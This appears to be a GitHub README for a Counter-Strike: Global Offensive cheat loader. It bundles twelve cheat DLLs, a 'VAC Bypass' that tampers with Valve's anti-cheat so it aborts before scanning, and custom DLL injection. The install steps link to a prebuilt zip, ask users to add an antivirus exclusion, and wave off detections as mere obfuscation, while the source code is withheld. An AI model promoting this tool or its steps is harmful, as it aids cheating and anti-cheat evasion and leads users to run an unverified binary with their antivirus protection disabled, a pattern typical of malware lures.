# CS:GO Cheat Injector
A free CS:GO Cheat loader with VAC Bypass. Includes [12 free cheats](https://github.com/Counter-Strike-Go/Cheat-Injector#Supported-Cheats) and a simple installer allowing you to easily test out different cheats while avoiding VAC Bans.

![image](https://user-images.githubusercontent.com/108346381/179973946-021434e4-3c42-458c-ba2a-107527fccfbd.png)

I created this cheat installer because I was sick of people asking on Discord how to install or compile various free CS:GO cheats, this program makes it a one click process. I can't take credit for this code, most of it was written by other people, I just pulled it all together. I intend to release the source code of this project soon so anyone can contribute to building the best possible cheat loader for CS:GO.

## How To Install
1. [Download from here](https://github.com/Counter-Strike-Go/Cheat-Injector/releases/latest/download/CS.GO.Cheat.Injector.zip), make sure you unzip. You may need to add an exclusion to your antivirus, [learn more](https://github.com/Counter-Strike-Go/Cheat-Injector#Antivirus).
3. Choose if you'd like to run VAC Bypass ([more info](https://github.com/Counter-Strike-Go/Cheat-Injector#VAC-Bypass-Loader)).
4. Choose the cheat you'd like to load [from the list](https://github.com/Counter-Strike-Go/Cheat-Injector#Supported-Cheats).

Please report any bugs [here](https://github.com/Counter-Strike-Go/Cheat-Injector/issues/new).

## Antivirus
Why do cheats trigger my Antivirus? Cheats aim to evade detection by Anticheat software, many of the methods they use to achieve this are the same methods used by viruses to evade detection by antivirus. Here's an over simplified example: One of the most basic levels of protection is obfuscation and packing, this makes it harder for anticheat software to detect cheats by "hiding" the original code, but because the code is now hidden the antivirus has no idea if the code is a cheat or malware so to be safe it presumes it's malware and triggers an antivirus alert.

To add an exclusion to Windows Defender [here's a guide](https://support.microsoft.com/en-gb/windows/add-an-exclusion-to-windows-security-811816c0-4dfd-af4a-47e4-c301afe13b26).

## Supported Cheats
I've compiled the DLL files for the following cheats and allow you to easily load them in Counter-Strike Global Offensive.

- Osiris Multihack
- Seaside Changer
- Nullhooks
- NEPS
- FluidAim
- Dainsleif
- cshSkins
- GOESP
- Onetap v2
- RaweTrip
- Untery
- Weave

## VAC Bypass Loader
Avoid VAC Bans with the VAC Bypass injector which modifies the client side VAC software and causes it to abort before it trys to scan for cheats. This allows you to avoid VAC bans even if running a cheat that has been detected by VAC. It also ensures that undetected cheats remain safe if they ever get detected in the future.

This method has gone undetected for years, however Valve could detect this method in the future and VAC ban accounts using it. But this risk also applies to VAC detecting the cheat you're using. So if you're using any free cheats I recommend you also use VAC Bypass.

VAC Bypass is optional, for example if you own a private CS:GO cheat which you know is undetected you might not use VAC Bypass.

## Cheat DLL Injector
Do you have a cheat DLL file you'd like to inject? We provide the ability to load your own custom DLL files. Click the button "Inject your own Cheat DLL"



